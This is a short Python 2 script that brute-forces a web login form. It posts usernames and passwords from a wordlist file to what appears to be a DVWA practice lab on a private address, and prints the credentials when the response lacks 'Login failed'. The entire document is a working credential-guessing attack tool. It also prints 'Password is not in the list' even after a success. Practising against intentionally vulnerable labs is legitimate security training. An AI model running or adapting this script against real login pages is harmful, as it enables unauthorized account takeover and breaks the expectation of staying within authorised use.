#!/usr/bin/python
import requests


def bruteforce(username, url):
	for password in passwords:
		password = password.strip()
		print(" Trying to Bruteforce with password: " + password)
		data_dictionary = {"username":username, "password":password, "Login":"submit"}
		response = requests.post(url,data=data_dictionary)
		if "Login failed" in response.content:
			pass
		else:
			print("Username: --> " + username)
			print("Password: --> " + password)
			break


page_url = "http://192.168.85.141/dvwa/login.php"
username =raw_input("Enter the username ")

with open("passlist.txt","r") as passwords:
	bruteforce(username,page_url)


print("Password is not in the list ") 
